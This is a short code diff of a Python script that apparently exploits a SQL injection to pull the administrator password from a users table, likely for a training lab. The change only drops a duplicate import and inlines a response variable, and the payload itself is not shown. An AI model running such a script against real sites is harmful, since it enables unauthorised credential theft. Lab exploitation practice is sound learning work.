@@ -1,6 +1,5 @@
 import sys
 import requests
-import sys
 import urllib3
 from bs4 import BeautifulSoup
 import re
@@ -23,9 +22,7 @@ def exploit_sqli_users_table(url):
     # Verify false to not verify tls certificates
     r = requests.get(url + path + sql_payload, verify=False)
 
-    res = r.text
-
-    if "administrator" in res:
+    if "administrator" in r.text:
         print("[+] Found the administrator password...")
         
         soup = BeautifulSoup(r.text, 'html.parser')
